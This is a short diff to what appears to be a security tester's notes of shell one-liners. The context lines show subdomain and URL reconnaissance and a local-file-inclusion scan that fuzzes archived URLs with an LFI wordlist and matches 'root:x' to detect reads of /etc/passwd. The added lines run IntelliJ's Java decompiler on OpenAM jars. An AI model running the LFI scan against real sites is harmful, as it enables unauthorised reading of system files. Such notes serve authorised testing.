@@ -21,3 +21,6 @@ findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” 
 
 # LFI
 findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
+
+# 利用Idea 自带的 Jar 反编译工具
+java -Xmx7066M -cp "/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -mpm=3 ./lib/openam* ./lib-decompiled
